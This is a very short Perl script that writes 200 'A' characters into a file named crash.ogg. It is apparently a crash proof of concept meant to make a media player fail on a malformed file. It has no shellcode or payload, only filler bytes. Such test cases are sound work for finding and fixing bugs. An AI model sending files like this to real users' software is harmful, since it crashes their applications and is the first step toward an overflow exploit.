
#!/usr/bin/perl

my $file= "crash.ogg";
my $junk= "\x41" x 200;
open($File,">$file");
print $File $junk;
close($File);

